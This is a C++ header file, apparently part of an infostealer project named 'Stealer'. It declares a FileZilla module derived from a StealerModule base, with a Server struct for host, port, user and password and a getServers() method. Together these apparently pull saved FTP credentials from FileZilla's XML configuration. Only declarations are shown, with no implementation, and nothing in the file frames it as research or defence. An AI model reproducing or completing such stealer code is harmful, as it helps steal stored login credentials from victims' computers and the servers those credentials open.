//
// Created by .1qxz on 08.06.2024.
//

#ifndef STEALER_FILEZILLA_H
#define STEALER_FILEZILLA_H


#include "../StealerModule.h"
#include <pugixml.hpp>

struct Server {
    std::string host;
    int port;
    std::string user;
    std::string pass;
};

class FileZilla : public StealerModule {
public:
    void execute(fs::path &root) override;
private:
    static std::vector<Server> getServers();
};


#endif //STEALER_FILEZILLA_H
